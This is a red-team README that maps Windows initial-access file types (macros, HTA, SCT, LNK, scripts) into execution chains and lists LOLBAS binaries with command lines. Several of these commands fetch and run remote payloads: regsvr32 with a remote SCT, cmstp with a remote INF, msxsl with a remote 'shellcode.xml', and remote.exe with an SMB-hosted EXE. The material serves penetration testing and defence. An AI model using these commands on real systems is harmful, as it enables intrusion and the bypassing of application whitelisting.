# Windows-Initial-Access
Initial access for Red Team

## Network graph

![Windows_initial_access](https://raw.githubusercontent.com/hegusung/Windows-Initial-Access/master/Windows%20initial%20access%20v0.3.png)

# Description

## Entry point

### Clickable

- EXE/SCR/PIF
- .Net EXE
- JNLP
- LNK
- VBS/VBE
- JS/JSE
- WSF
- HTA
- SettingContent-ms
- SCT ???

### Macro (Microsoft Office)

#### Output

- VBA

### OLE (Microsoft Office)

#### Output

- Any clickable

### Excel

#### Output

- INF
- DDE (command execution)

### ClickOnce

#### Output

- EXE
- .Net EXE

## Containers

- ISO / IMG
- CAB
- Zip
- 7zip
- many more !

## Text-based files

### VBA

#### Input

- Macro

#### Output

- COM objects
- Windows APIs
- SCT

### VBS/VBE

#### Input

- click !
- wscript.exe / cscript.exe
- HTA
- XSL
- WSF
- SCT

#### Output

- COM objects
- Windows APIs
- SCT

### JS/JSE

#### Input

- click !
- wscript.exe / cscript.exe
- HTA
- XSL
- WSF
- SCT

#### Output

- COM objects
- SCT

### PS1

#### Input

- powershell.exe

#### Output

- COM objects
- Windows APIs
- SCT

### HTA

#### Input

- click !
- mshta.exe

#### Output

- VBS/VBE - local
- JS/JSE - local

### XSL

#### Input

- msxsl.exe
- wmic
- COM objects

#### Output

- VBS/VBE - local
- JS/JSE - local

### WSF

#### Input

- click !

#### Output

- VBS/VBE - local
- JS/JSE - local
- VBS/VBE - remote
- JS/JSE - remote

### SCT

#### Input

- click ???
- regsvr32.exe - remote & local
- rundll32.exe - remote & local
- powershell.exe - remote & local
- pubprn.vbs - remote & local
- VBS/VBE
- JS/JSE
- INF

#### Output

- VBS/VBE - local
- JS/JSE - local
- VBS/VBE - remote
- JS/JSE - remote

### INF

#### Input

- Excel
- cmstp.exe - local
- rundll32.exe - local

#### Output

- SCT

### SettingContent-ms

#### Input

- Click !

#### Output

- Command execution

### CHM

#### Input

- hh.exe - local & remote

#### Output

- Command execution

## Binary files

### EXE/SCR/PIF

#### Input

- Click !
- ClickOnce
- MSI

#### Output

- Windows APIs
- COM objects

### DLL/XLL

#### Input

- rundll32.exe
- COM object (XLL only)
- MSI

#### Output

- Windows APIs
- COM objects

### .Net EXE

#### Input

- Click !
- ClickOnce
- COM Object
- InstallUtil.exe

#### Output

- Windows APIs
- COM objects

### .Net DLL

#### Input

- Click !
- ClickOnce
- COM Object
- InstallUtil.exe
- regasm.exe
- regsvcs.exe

#### Output

- Windows APIs
- COM objects

### JNLP

#### Input

- Click !

#### Output

- Windows APIs
- COM objects

### LNK

#### Input

- Click !

#### Output

- Command execution

## Command Execution

### Inputs

- Windows APIs
- COM objects
- LNK file
- CHM file
- SettingsContent-ms file
- DDE
- WMI

### Output

- LOLBAS - execute : [https://lolbas-project.github.io/#/execute](https://lolbas-project.github.io/#/execute)
- LOLBAS - download : [https://lolbas-project.github.io/#/download](https://lolbas-project.github.io/#/download)
- LOLBAS - copy : [https://lolbas-project.github.io/#/copy](https://lolbas-project.github.io/#/copy)
- LOLBAS - decode : [https://lolbas-project.github.io/#/decode](https://lolbas-project.github.io/#/decode)
- LOLBAS - application whitelisting bypass : [https://lolbas-project.github.io/#/awl](https://lolbas-project.github.io/#/awl)
- Write to disk (text file)
- Execute any binary on disk

## LOLBAS

This section list some interesting entries of the LOLBAS website. Non exhaustive list

[https://lolbas-project.github.io/](https://lolbas-project.github.io/)

### cmstp.exe

#### System:

- Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

#### Paths:

- C:\Windows\System32\cmstp.exe
- C:\Windows\SysWOW64\cmstp.exe

#### Remote:

```bash
cmstp.exe /ni /s c:\cmstp\CorpVPN.inf
```

#### Execution:

```bash
cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf
```

### dfsvc.exe

#### System:

- Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

#### Paths:

- C:\Windows\Microsoft.NET\Framework\v2.0.50727\Dfsvc.exe
- C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Dfsvc.exe
- C:\Windows\Microsoft.NET\Framework\v4.0.30319\Dfsvc.exe
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Dfsvc.exe

#### Remote ClickOnce:

```bash
rundll32.exe dfshim.dll,ShOpenVerbApplication http://www.domain.com/application/?param1=fooExecution:
```

### Installutil.exe

#### System:

- Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

#### Paths:

- C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe
- C:\Windows\Microsoft.NET\Framework64\v2.0.50727\InstallUtil.exe
- C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe

#### Execute .Net DLL or EXE:

```bash
InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
```

### **Microsoft.Workflow.Compiler.exe**

#### System:

- Windows 10S, Windows 11

#### Paths:

- C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe

#### Execute C# or VB.net:

Compile and execute C# or [VB.net](http://vb.net/) code in a XOML file referenced in the test.xml file.

```bash
Microsoft.Workflow.Compiler.exe tests.xml results.xml
```

### **Msbuild.exe**

#### System:

- Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

#### Paths:

- C:\Windows\Microsoft.NET\Framework\v2.0.50727\Msbuild.exe
- C:\Windows\Microsoft.NET\Framework64\v2.0.50727\Msbuild.exe
- C:\Windows\Microsoft.NET\Framework\v3.5\Msbuild.exe
- C:\Windows\Microsoft.NET\Framework64\v3.5\Msbuild.exe
- C:\Windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Msbuild.exe
- C:\Program Files (x86)\MSBuild\14.0\bin\MSBuild.exe

#### Execute C#:

Build and execute a C# project stored in the target XML file.

```bash
msbuild.exe pshell.xml
```

#### Execute DLL:

Executes generated Logger DLL file with TargetLogger export

```bash
msbuild.exe /logger:TargetLogger,C:\Loggers\TargetLogger.dll;MyParameters,Foo
```

#### Execute JS/VBS:

Execute jscript/vbscript code through XML/XSL Transformation. Requires Visual Studio MSBuild v14.0+.

```bash
msbuild.exe project.proj
```

### **Msdt.exe**

#### System:

- Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

#### Paths:

- C:\Windows\System32\Msdt.exe
- C:\Windows\SysWOW64\Msdt.exe

#### Execute MSI:

Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the PCW8E57.xml file.

```bash
msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af C:\PCW8E57.xml /skip TRUE
```

### **Regasm.exe**

#### System:

- Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

#### Paths:

- C:\Windows\Microsoft.NET\Framework\v2.0.50727\regasm.exe
- C:\Windows\Microsoft.NET\Framework64\v2.0.50727\regasm.exe
- C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe

#### Execute .Net DLL:

Loads the target .DLL file and executes the RegisterClass function.

```bash
regasm.exe AllTheThingsx64.dll
```

Loads the target .DLL file and executes the UnRegisterClass function.

```bash
regasm.exe /U AllTheThingsx64.dll
```

### **Regsvcs.exe**

#### System:

- Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

#### Paths:

- c:\Windows\Microsoft.NET\Framework\v*\regsvcs.exe
- c:\Windows\Microsoft.NET\Framework64\v*\regsvcs.exe

#### Execute .Net DLL:

Loads the target .DLL file and executes the RegisterClass function.

```bash
regsvcs.exe AllTheThingsx64.dll
```

### **Regsvr32.exe**

#### System:

- Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

#### Paths:

- c:\Windows\Microsoft.NET\Framework\v*\regsvcs.exe
- c:\Windows\Microsoft.NET\Framework64\v*\regsvcs.exe

#### Execute remote SCT script:

Execute the specified remote .SCT script with scrobj.dll.

```bash
regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
```

#### Execute remote SCT script:

Execute the specified local .SCT script with scrobj.dll.

```bash
regsvr32.exe /s /u /i:file.sct scrobj.dll
```

### **AccCheckConsole.exe**

#### System:

- Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11

#### Paths:

- C:\Program Files (x86)\Windows Kits\10\bin\*\x86\AccChecker\AccCheckConsole.exe
- C:\Program Files (x86)\Windows Kits\10\bin\*\x64\AccChecker\AccCheckConsole.exe
- C:\Program Files (x86)\Windows Kits\10\bin\*\arm\AccChecker\AccCheckConsole.exe
- C:\Program Files (x86)\Windows Kits\10\bin\*\arm64\AccChecker\AccCheckConsole.exe

#### **Execute** DLL:

Load a managed DLL in the context of AccCheckConsole.exe. The -window switch value can be set to an arbitrary active window name.

```bash
AccCheckConsole.exe -window "Untitled - Notepad" C:\path\to\your\lolbas.dll
```

### **Dotnet.exe**

#### System:

- Windows 7 and up with .NET installed

#### Paths:

- C:\Program Files\dotnet\dotnet.exe

#### **Execute** DLL:

Load a managed DLL in the context of AccCheckConsole.exe. The -window switch value can be set to an arbitrary active window name.

```bash
dotnet.exe [PATH_TO_DLL]
```

#### **Execute CSProj**

```bash
dotnet.exe msbuild [Path_TO_XML_CSPROJ]
```

### **msxsl.exe**

#### System:

- Windows

#### Paths:

- No default

#### **Execute** XSL:

Load a managed DLL in the context of AccCheckConsole.exe. The -window switch value can be set to an arbitrary active window name.

```bash
msxsl.exe customers.xml script.xsl
```

#### **Execute** remote XSL:

```bash
msxsl.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml
```

#### Download:

```bash
msxsl.exe https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/calc.xml https://raw.githubusercontent.com/RonnieSalomonsen/Use-msxsl-to-download-file/main/transform.xsl -o <filename>
```

### **Remote.exe**

#### System:

- Windows

#### Paths:

- C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\remote.exe
- C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\remote.exe

#### **Execute EXE**:

Spawns powershell as a child process of remote.exe

```bash
Remote.exe /s "powershell.exe" anythinghere
```

#### **Execute** remote EXE:

Run a remote file  (WebDAV or SMB ?)

```bash
Remote.exe /s "\\10.10.10.30\binaries\file.exe" anythinghere
```

### **Tracker.exe**

#### System:

- Windows

#### Paths:

- C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.8 Tools\tracker.exe

#### **Execute DLL**:

```bash
Tracker.exe /d .\calc.dll /c C:\Windows\write.exe
```

## Com objects

### Inputs

- C/C++
- .NET
- Powershell
- VBS/VBE
- JS/JSE
- VBA

### Outputs

- Command execution
- Internet download
- Base64 / Hex decoding
- Write on disk
- WMI queries
- Schedule Tasks
- Registry modification
- Loading .Net in memory
- Execute DLL on disk
- Execute XSL files (remote/local)

## Windows APIs

### Inputs

- C/C++
- .Net
- Powershell
- VBS/VBE
- VBA

### Outputs

- Command execution
- Internet download
- Decoding / Decryption
- Write on Disk
- Registry modification
- Execute in memory (DLLs, reflective DLLs, Shellcode)
- COM Objects
- Probably more… research to be done !

# Sources:
  * https://blog.f-secure.com/dechaining-macros-and-evading-edr/
